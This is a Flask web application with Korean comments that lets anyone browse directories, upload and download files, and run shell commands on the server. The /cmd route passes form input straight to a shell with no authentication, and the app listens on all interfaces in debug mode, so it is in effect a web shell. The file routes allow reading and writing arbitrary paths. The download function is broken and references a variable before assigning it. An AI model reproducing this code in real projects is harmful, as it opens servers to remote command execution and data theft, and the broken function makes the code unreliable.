from flask import Flask, render_template, request, send_file, redirect, url_for, flash
import os,re
import subprocess

app = Flask(__name__)
app.secret_key = 'your_secret_key'
app.config['UPLOAD_FOLDER'] = 'uploads'

@app.route('/')
def index():
    directories = []
    files = []
    current_path = request.args.get('path', '/')
    for item in os.listdir(current_path):
        item_path = os.path.join(current_path, item)
        if os.path.isdir(item_path):
            directories.append(item)
        else:
            files.append(item)
    return render_template('index.html', directories=directories, files=files, current_path=current_path)

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        file = request.files['file']
        if file:
            filename = file.filename
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)  # Create the directory if it doesn't exist
            file.save(file_path)
            flash('File uploaded successfully!', 'success')
        else:
            flash('No file selected!', 'error')
        return redirect(url_for('index'))
    return render_template('upload.html')

# 기존 코드 (생략)

@app.route('/download/<path:path>')
def download(path):
    print(f"Download requested path: {path}")  # 디버깅을 위해 경로 출력

    # 현재 작업 디렉토리(pwd) 경로 제거
    current_dir = os.getcwd()
    normalized_path = normalized_path.replace(current_dir, '/')
    
    # 경로에서 연속된 슬래시를 단일 슬래시로 대체
    normalized_path = re.sub(r'/+', '/', path)
    
    # 파일의 존재 여부 확인
    if not os.path.isfile(normalized_path):
        print(f"File not found: {normalized_path}")  # 디버깅을 위해 메시지 출력
        return f"File not found: {normalized_path}", 404
    
    return send_file(normalized_path, as_attachment=True)



@app.route('/cmd', methods=['GET', 'POST'])
def cmd():
    if request.method == 'POST':
        command = request.form['command']
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            return render_template('cmd.html', output=output)
        except subprocess.CalledProcessError as e:
            error_message = f"명령어가 없습니다: {command}"
            return render_template('cmd.html', error=error_message)
    return render_template('cmd.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
